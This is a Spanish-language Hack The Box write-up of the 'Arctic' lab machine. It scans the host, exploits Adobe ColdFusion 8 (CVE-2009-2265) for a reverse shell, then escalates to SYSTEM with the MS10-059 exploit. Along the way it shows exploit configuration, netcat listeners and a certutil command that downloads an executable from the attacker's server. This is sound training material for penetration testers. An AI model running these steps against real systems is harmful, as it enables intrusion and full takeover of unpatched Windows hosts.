---
layout: single
title: Arctic - Hack The Box
excerpt: "Una máquina algo sencilla, vamos a vulnerar el servicio Adobe ColdFusion 8 usando el Exploit CVE-2009-2264 que nos conectara directamente a la máquina usando una Reverse Shell, entraremos como usuario y usaremos el Exploit MS10-059 para escalar privilegios y convertirnos en NT Authority System."
date: 2023-02-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-artic/artic_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - FTMP
  - Adobe ColdFusion
  - Remote Command Execution (RCE) 
  - CVE-2009-2265 (RCE)
  - Reverse Shell
  - System Recognition (Windows)
  - Local Privilege Escalation (LPE) 
  - Privesc - MS10-059 (LPE)
  - OSCP Style
---
![](/assets/images/htb-writeup-artic/artic_logo.png)

Una máquina algo sencilla, vamos a vulnerar el servicio **Adobe ColdFusion 8** usando el Exploit **CVE-2009-2264** que nos conectara directamente a la máquina usando una **Reverse Shell**, entraremos como usuario y usaremos el Exploit **MS10-059** para escalar privilegios y convertirnos en **NT Authority System**.

-------
**ADVERTENCIA**:
Esta máquina es bastante lenta, en su momento me desespere, pero *"la paciencia es la madre de la ciencia"*, advertido estas.

-------

Herramientas utilizadas:
* *ping*
* *nmap*
* *searchsploit*
* *python*
* *nc*
* *python2*
* *windows-exploit-suggester.py*
* *python3*
* *certutil.exe*


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
				<li><a href="#Investigacion">Investigación de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Investigacion2">Entrando al Protocolo FMTP desde la Web</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Exploit">Buscando un Exploit</a></li>
				<ul>
                                        <li><a href="#PruebaExp">Probando Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)</a></li>
                                </ul>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
				<ul>
					<li><a href="#Enum">Enumeración de Máquina</a></li>
					<ul>
						<li><a href="#PruebaExp2">Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)</a></li>
	                                	<li><a href="#PruebaExp3">Prueba Exploit: Adobe ColdFusion - Directory Traversal</a></li>
                	                	<li><a href="#PruebaExp4">Prueba Exploit: Juicy Potato</a></li>
					</ul>
                        	</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Realizamos un ping para saber si la máquina está conectada y en base al TTL sabremos que SO ocupa la máquina.
```bash
ping -c 4 10.10.10.11   
PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=131 ms
64 bytes from 10.10.10.11: icmp_seq=2 ttl=127 time=135 ms
64 bytes from 10.10.10.11: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.11: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.11 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 130.538/131.733/134.557/1.638 ms
```
Al parecer la máquina usa Windows. Es momentos de hacer los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 13:43 CST
Initiating SYN Stealth Scan at 13:43
Scanning 10.10.10.11 [65535 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed SYN Stealth Scan at 13:43, 27.46s elapsed (65535 total ports)
Nmap scan report for 10.10.10.11
Host is up, received user-set (0.28s latency).
Scanned at 2023-02-17 13:43:06 CST for 28s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
135/tcp  open  msrpc   syn-ack ttl 127
8500/tcp open  fmtp    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 30 (1.316KB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay 2 puertos activos y que yo recuerde no nos hemos enfrentado a esos dos, hagamos el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sC -sV -p135,8500 10.10.10.11 -oN targeted                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 13:45 CST
Nmap scan report for 10.10.10.11
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8500/tcp open  fmtp?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.29 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

No nos dio mucha información que digamos. Vamos a investigar los servicios.

<h2 id="Investigacion">Investigación de Servicios</h2>

Vamos a empezar por el **MSRPC**:

| **Protocolo MS-RPC** |
|:-----------:|
| *El protocolo de Llamada a Procedimiento Remoto de Microsoft (MSRPC), es un modelo cliente-servidor que permite a un programa solicitar un servicio de un programa ubicado en otra computadora, sin entender los detalles de la red, se derivó inicialmente de software de código abierto y posteriormente fue desarrollado y protegido por derechos de autor por Microsoft. El mapeador de puntos finales de RPC se puede acceder a través de los puertos TCP y UDP 135, SMB en TCP 139 y 445 (con una sesión nula o autenticada), y como un servicio web en el puerto TCP 593. MS-RPC se deriva de la implementación de referencia (V1.1) del protocolo RPC en el núcleo del entorno informático distribuido.* |

<br>

De momento, no creo que sea una opción atacar este puerto. Veamos que es el **protocolo FMTP**:

| **Protocolo FMTP** |
|:-----------:|
| *Flight Message Transfer Protocol (FMTP) es una pila de comunicación basada en los protocolos de control de transmisión e Internet (TCP/IP). Se utiliza en un contexto de comunicación de igual a igual para el intercambio de información entre sistemas de tratamiento de datos de vuelo con fines de notificación, coordinación y transferencia de vuelos entre dependencias de control del tráfico aéreo y con fines de cooperación civil-militar.*|

<br>

Orale, es un protocolo interesante, es muy similar al **protocolo SMTP** y resulta implementa una página web. Vamos a investigar esta página.


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="Investigacion2">Entrando al Protocolo FMTP desde la Web</h2>

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-artic/Captura1.png">
</p>

Hay solamente 2 directorios, veamos que hay en el primero:

<p align="center">
<img src="/assets/images/htb-writeup-artic/Captura2.png">
</p>

Hay una en especial que podemos ver, que es el directorio **administrator**. Antes de meternos ahí, veamos que hay en el otro directorio principal:

<p align="center">
<img src="/assets/images/htb-writeup-artic/Captura3.png">
</p>

No hay nada que sea de interés que yo sepa, entonces vamos al directorio **administrator**:

![](/assets/images/htb-writeup-artic/Captura4.png)

Ok, ya tenemos un servicio más especifico, pero ¿qué es eso de **Adobe ColdFusion**? Investiguemos:

| **Adobe ColdFusion** |
|:-----------:|
| *Coldfusion es una plataforma de desarrollo rápido de aplicaciones web que usa el lenguaje de programación CFML. En este aspecto, es un producto similar a ASP, JSP o PHP. ColdFusion es una herramienta que corre en forma concurrente con la mayoría de los servidores web de Windows, Mac OS X, Linux y Solaris.* |

<br>

Entonces, se esta implementando una aplicación web, por eso las credenciales que pide. Vamos a buscar si hay un Exploit para este servicio.


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="Exploit">Buscando un Exploit</h2>

Como ya tenemos un servicio específico y la versión, entonces vamos a usar **Searchsploit**
```bash
searchsploit adobe coldfusion 8
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                        | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                     | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                        | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                         | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                              | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                          | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                         | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                        | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                  | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                     | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                            | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                  | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting               | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scri | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting     | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting      | cfm/webapps/33168.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Excelente, tenemos un **RCE**, vamos a analizarlo.

<br>

<h3 id="PruebaExp">Probando Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)</h3>

Copiemos el Exploit en nuestro espacio de trabajo:
```bash
searchsploit -x cfm/webapps/50057.py        
  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
    Codes: CVE-2009-2265
 Verified: False
File Type: Python script, ASCII text executable
```

Analizándo el Exploit, nos pide los siguientes datos:
```bash
if __name__ == '__main__':
    # Define some information
    lhost = 'IP_random'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex
```

Solamente tenemos que cambiarlos, eso me indica que este Exploit es usable para **Metasploit**. Pero checa esto:
```bash
os.system(f'msfvenom -p java/jsp_shell_reverse_tcp
```
Está generando un Payload para conectarnos a la máquina de manera remota. Vamos a probar el Exploit, así que vamos a configurarlo por pasos.

* Cambiamos los datos:
```bash
    lhost = 'Tu_IP'
    lport = 443
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex
```

* Levantamos una netcat:
```bash
nc -nvlp 443    
listening on [any] 443 ...
```

* Y activamos el Exploit:
```bash
python Adobe_Exploit.py                                                          
Generating a payload...
Payload size: 1496 bytes
Saved as: f01dfac413bd448a82db8852a0a74b68.jsp
Priting request...
Content-type: multipart/form-data; boundary=0c8478e180f44be7af5362027e35ef54
Content-length: 1697
--0c8478e180f44be7af5362027e35ef54
Content-Disposition: form-data; name="newfile"; filename="f01dfac413bd448a82db8852a0a74b68.txt"
Content-Type: text/plain
...
```

* Tardo bastante, pero ya estamos dentro:
```bash
nc -nvlp 443    
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.11] 49408
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

La flag del usuario se encuentra en el directorio **tolis**:
```batch
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of C:\Users
22/03/2017  10:00 ��    <DIR>          .
22/03/2017  10:00 ��    <DIR>          ..
22/03/2017  09:10 ��    <DIR>          Administrator
14/07/2009  07:57 ��    <DIR>          Public
22/03/2017  10:00 ��    <DIR>          tolis
               0 File(s)              0 bytes
               5 Dir(s)   1.434.054.656 bytes free
```


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id="Enum">Enumeración de Máquina</h2>

Bueno ya estamos dentro, vamos a ver de qué nos podemos aprovechar para poder ganar acceso como Root.
```batch
C:\>cd Program Files
cd Program Files
C:\Program Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of C:\Program Files
26/12/2017  01:13 ��    <DIR>          .
26/12/2017  01:13 ��    <DIR>          ..
26/12/2017  01:13 ��    <DIR>          Common Files
14/07/2009  08:41 ��    <DIR>          Internet Explorer
26/12/2017  01:13 ��    <DIR>          VMware
14/07/2009  06:20 ��    <DIR>          Windows Mail
14/07/2009  08:37 ��    <DIR>          Windows NT
               0 File(s)              0 bytes
               7 Dir(s)   1.434.054.656 bytes free
C:\Program Files>cd ..
cd ..
C:\>cd "Program Files (x86)"
cd "Program Files (x86)"
C:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of C:\Program Files (x86)
14/07/2009  08:06 ��    <DIR>          .
14/07/2009  08:06 ��    <DIR>          ..
14/07/2009  06:20 ��    <DIR>          Common Files
14/07/2009  08:41 ��    <DIR>          Internet Explorer
14/07/2009  06:20 ��    <DIR>          Windows Mail
14/07/2009  08:37 ��    <DIR>          Windows NT
               0 File(s)              0 bytes
               6 Dir(s)   1.434.054.656 bytes free
C:\Program Files (x86)>cd ..
cd ..
```
Pues no hay que sepa que podamos usar. 

Veamos que privilegios tenemos:
```batch
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
Tenemos el **SeImpersonatePrivilege** podemos aprovecharnos de ese, pero vamos a usar la herramienta **Windows Exploit Suggester** a ver que nos dice. 

Recuerda que vamos a necesitar la información del sistema, usa el comando **systeminfo** y copia todo en un archivo **.txt**.
```batch
python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
```
Hay varios Exploits que podemos usar, vamos a usar el **MS10-059** para poder ganar acceso como **Root**.

<br>

<h3 id="PruebaExp2">Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)</h3>

Para descargarlo, usaremos el siguiente link:
* <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">Repositorio de SecWiki: Windows-kernel-exploits</a>

Una vez descargado, lo pasamos a nuestro directorio de trabajo y lo vamos a subir a la máquina para activarlo, vámonos por pasos:

* Abrimos un servidor con **Python**:
```bash
python3 -m http.server                                                                     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Nos vamos a la carpeta **Temp** y creamos la carpeta **Privesc** para guardar ahí el Exploit:
```batch
c:\>cd Windows/Temp
cd Windows/Temp
c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of c:\Windows\Temp
c:\Windows\Temp>mkdir Privesc
mkdir Privesc
c:\Windows\Temp>cd Privesc
cd Privesc
```

* Descargamos el Exploit desde la máquina usando **certutil.exe**:
```batch
c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://Tu_IP:8000/MS10-059.exe MS10-059.exe
certutil.exe -urlcache -split -f http://Tu_IP:8000/MS10-059.exe MS10-059.exe
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.
```

* Levantamos una netcat:
```bash
nc -nvlp 1337     
listening on [any] 1337 ...
```

* Activamos el exploit:
```batch
c:\Windows\Temp\Privesc>MS10-059.exe Tu_IP 1337
MS10-059.exe Tu_IP 1337
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```

* ¡Y listo!, ya solamente buscamos la flag en el directorio **Administrator** y listo:
```bash
nc -nvlp 1337     
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.11] 49790
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
c:\Windows\Temp\Privesc>whoami
whoami
nt authority\system
```

La verdad esta máquina se me hizo algo pesada, porque es muy tardado el uso de los servicios que esta usando, lo que te puede llegar a aburrir y frustrar, pero no te desesperes, pues puede que algún día te toque auditar servicios así de lentos. Veamos que otra cosa se puede probar.

<br>

<h3 id="PruebaExp3">Prueba Exploit: Adobe ColdFusion - Directory Traversal</h3>

Existe otra forma de acceder a la máquina como usuario, para esto usaríamos el Exploit **Adobe ColdFusion - Directory Traversal**.

En el siguiente link, te explica cómo puedes obtener las credenciales para acceder al **Adobe ColdFusion** y usar una vulnerabilidad para cargar un Payload que tenga una **Reverse Shell** para que puedas accesar al sistema:
* <a href="https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/" target="_blank">ColdFusion directory traversal FAQ (CVE-2010-2861)</a>

Este link viene en dicho Exploit: **CVE-2010-2861**

<br>

<h3 id="PruebaExp4">Prueba Exploit: Juicy Potato</h3>

Después de usar el **Windows Exploit Suggester**, intente probar algunos Exploits, estos son:
* *MS11-011*
* *MS10-047*
* *MS11-046*

El último lo utilizamos en la **máquina Devel** pero aquí no funciono ni ese ni los otros que liste. Quizá a ti te funcionen, pruébalos si tienes tiempo y si no pues ve a lo seguro.

He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es una variante del **Juicy** o el mismo que el **MS10-059**, no lo sé bien, aunque yo no probe **Juicy Potato** puedes intentarlo tú.


<br>
<br>
<div style="position: relative;">
	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


* https://www.mailjet.com/es/blog/emailing/servidor-smtp/
* https://github.com/0xkasra/CVE-2009-2265
* https://www.google.com/search?client=firefox-b-e&q=Microsoft+Windows+Server+2008+R2+Standard++6.1.7600+N%2FA+Build+7600+exploit
* https://www.infosecmatter.com/nessus-plugin-library/?id=51911
* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
* https://github.com/egre55/windows-kernel-exploits
* https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
